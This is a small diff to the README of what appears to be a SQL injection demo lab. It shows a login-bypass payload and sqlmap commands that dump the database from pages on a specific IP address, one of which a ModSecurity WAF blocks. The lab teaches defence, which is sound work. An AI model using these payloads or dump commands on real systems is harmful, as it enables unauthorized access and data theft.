@@ -27,7 +27,6 @@ The goal is to showcase how SQL Injection can be exploited and then mitigated us
 ```
 ' OR '1'='1
 sqlmap -u "http://3.87.88.51/page1.php" --data="username=test*&password=test" --method=POST --dbms=mysql --technique=B --batch --dump
-
 ```
 ✅ Should log in (bypasses authentication).
 
@@ -37,7 +36,6 @@ sqlmap -u "http://3.87.88.51/page1.php" --data="username=test*&password=test" --
 ```
 ' OR '1'='1
 sqlmap -u "http://3.87.88.51/page2.php" --data="username=test*&password=test" --method=POST --dbms=mysql --technique=B --batch --dump
-
 ```
 ❌ Blocked by ModSecurity WAF.
 
